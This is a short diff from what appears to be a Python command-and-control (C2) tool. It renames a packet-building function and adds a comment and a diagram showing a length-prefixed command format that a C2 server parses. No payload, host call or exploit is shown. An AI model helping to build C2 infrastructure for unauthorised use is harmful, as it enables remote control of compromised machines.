@@ -5,7 +5,7 @@ import struct
 # or in what order based on which we can read them in recv()
 # and run the respective function or operation
 
-def sessions_packet_formation(command):
+def command_packet_formation(command): # forms command packet strcuture so that we can receive it in c2 server and understand what part of the command is what
 #     +----------------------+----------------------+
 #     | Command Length       | Command              |
 #     | 4 bytes              | N bytes              |
